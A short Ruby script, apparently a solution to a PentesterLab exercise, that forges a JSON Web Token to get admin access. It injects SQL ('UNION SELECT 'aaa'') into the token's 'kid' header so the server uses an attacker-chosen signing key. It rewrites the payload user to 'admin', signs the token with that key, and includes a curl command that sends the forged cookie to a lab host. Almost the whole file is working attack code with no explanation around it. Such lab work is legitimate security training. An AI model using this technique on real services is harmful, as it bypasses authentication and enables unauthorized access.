require 'base64'
require 'openssl'

# SELECT key FROM keys WHERE kid='[]'
# SELECT key FROM keys WHERE kid='key1'
# SELECT key FROM keys WHERE kid='zzzzzzzzzzzzzzzzzz' UNTION SELECT 'aaa'
# ===>> should return "aaa"

# orig {"typ":"JWT","alg":"HS256","kid":"key1"}
header = '{"typ":"JWT","alg":"HS256","kid":"zzzzzzzzzzzzzzzzzz\' UNION SELECT \'aaa"}'

# orig payload = '{"user":null}'
payload = '{"user":"admin"}'

# sig = '2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ'

data = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
data.gsub!("=","")

# for public/css header
# secret = File.open("../../../Documents/PenTesterLab/bootstrap.css").read
secret = "aaa"


signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))

puts data+"."+signature

# curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inp6enp6enp6enp6enp6enp6eicgVU5JT04gU0VMRUNUICdhYWEifQ.eyJ1c2VyIjoiYWRtaW4ifQ.nL0Oe2r8zl_ESZguw-o6D9bep3v5TzDMGcjqCA-S_eA=" ptl-bf3b9793-fd439f03.libcurl.so